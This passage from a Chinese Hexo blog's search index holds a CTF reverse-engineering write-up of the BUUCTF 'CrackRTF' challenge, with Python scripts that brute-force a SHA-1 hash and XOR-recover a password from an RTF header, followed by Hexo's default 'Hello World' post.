+ 20) ^ ((v3 &lt;&lt; 6) + a2[2]) ^ ((v3 &gt;&gt; 9) + a2[3]) ^ 0x10;            v3 -&#x3D; (v4 + v5 + 11) ^ ((v4 &lt;&lt; 6) + *a2) ^ ((v4 &gt;&gt; 9) + a2[1]) ^ 0x20;            v5 -&#x3D; 1166789954;        &#125;        a[j] &#x3D; v3;        a[j + 1] &#x3D; v4;    &#125;    &#x2F;*将整型数组作为字符输出，注意计算机小端排序*&#x2F;    for (int i &#x3D; 0; i &lt; 6; ++i) &#123;        cout &lt;&lt; *((char*)&amp;a[i] + 2) &lt;&lt; *((char*)&amp;a[i] + 1) &lt;&lt;  * ((char*)&amp;a[i]);    &#125;    system(&quot;PAUSE&quot;);    return 0;&#125;  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="BUUCTF-CrackRTF-拓宽思路"><a href="#BUUCTF-CrackRTF-拓宽思路" class="headerlink" title="BUUCTF CrackRTF(拓宽思路)"></a>BUUCTF CrackRTF(拓宽思路)</h3><ol><li>查看文件情况，无壳，32位，之后ida打开，发现main函数，在main函数位置进行反汇编<br><img src="/2021/120454815/36.png" alt=" "><br><img src="/2021/120454815/37.png" alt=" ">  </li><li>1处：先是对Destination、String1进行初始化，之后对Destination进行赋值，然后进行判断其长度是否等于6，等于6就符合要求<br>2处：显示将字符串Destination转换成（int）整形并赋值给v7，之后判断，如果v7&lt;100000，就不符合条件，所以我们知道v7&gt;100000<br>3处：将@DBApp子符串附加给Destination<br>4处：进行一个操作，具体情况如下图<br><img src="/2021/120454815/38.png" alt=" "><br>在这里我们可以看出该加密算法是哈希算法加密，并且由标识符0x8004u这里分析处使用的是SHA-1加密形式<br><a href="https://my.oschina.net/kivensoft/blog/549369">了解该形式加密解密算法请点击此处</a><br><a href="https://docs.microsoft.com/en-us/windows/win32/seccrypto/alg-id">标识符的官方文档请点击此处</a><br>5处：可以知道String1 == 6E32D0943418C2C33385BC35A1470250DD8923A9  </li><li>由五处我们就可以先接触flag的前六个字符串了  </li></ol><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> hashlibstring<span class="token operator">=</span><span class="token string">'@DBApp'</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">100000</span><span class="token punctuation">,</span><span class="token number">999999</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    flag<span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span>string    x <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>sha1<span class="token punctuation">(</span>flag<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"utf8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    y <span class="token operator">=</span> x<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">"6e32d0943418c2c33385bc35a1470250dd8923a9"</span> <span class="token operator">==</span> y<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>            <span class="token keyword">break</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>因为长度有限直接暴力破解(看到别人的不会暴力破解，学习，学习)<br>04. 6处：我们同样要输入长度是6的串<br>7处：同样进行4处的操作<br>8处：可以知道这次String1 == 27019e688a4e62a649fd99cadaafdb4e<br>但是无法爆破了，不知到怎么办，不会，向下看<br>05. 9处也是一个函数，双击进去看看<br><img src="/2021/120454815/39.png" alt=" "><br>06. 对于上面这张图我们从上往下看<br>首先是一个FindResourceA()函数，这个我们查过之后可以知道是找句柄的，并且是从AAA资源中找句柄的<br>再者这个是如果知道到了所要的资源就将其大小(长度)记录下来<br>然后这个是如果知道到了所要的资源就将其值赋给lpBuffer<br>最后一个函数操作并生成一个.rtf文件，函数操作如下<br><img src="/2021/120454815/40.png" alt=" "><br>同时分析知在该函数中其实就是资源的每一位和密码的每一位循环异或<br>异或结束之后，生成一个rtf文件<br>同时知道<br>我们的密码一共是6+12=18位<br>我们现在想要的是前六位的密码，循环异或的话，那么也就是说，资源的前六位与密码的前六位异或的结果就是rtf文件的前六位<br>07. 我们找来一个rtf文件，看看它的标志位<br><img src="/2021/120454815/41.png" alt=" "><br>前六位是{\rtfl<br>08. AAA资源的前六位是<br><img src="/2021/120454815/42.png" alt=" "><br>09. 脚本  </p><pre class="line-numbers language-python" data-language="python"><code class="language-python">rtf <span class="token operator">=</span> <span class="token string">'&#123;\\rtf1'</span> \\需要注意，\r需要转义，变成\\rA <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x05</span><span class="token punctuation">,</span> <span class="token number">0x7D</span><span class="token punctuation">,</span> <span class="token number">0x41</span><span class="token punctuation">,</span> <span class="token number">0x15</span><span class="token punctuation">,</span> <span class="token number">0x26</span><span class="token punctuation">,</span> <span class="token number">0x01</span><span class="token punctuation">]</span>password<span class="token operator">=</span><span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>rtf<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    x <span class="token operator">=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>rtf<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> A<span class="token punctuation">[</span>i<span class="token punctuation">]</span>    password<span class="token operator">+=</span><span class="token builtin">chr</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>password<span class="token punctuation">)</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>之后我们将程序运行将密码输入即可，两端密码输入完后，就会在程序所在文件夹中生成一个带有flag的rtf文件，打开就能得到flag  </p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2021/112316107.html"/>
      <url>/2021/112316107.html</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo new <span class="token string">"My New Post"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo server<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo generate<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo deploy<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
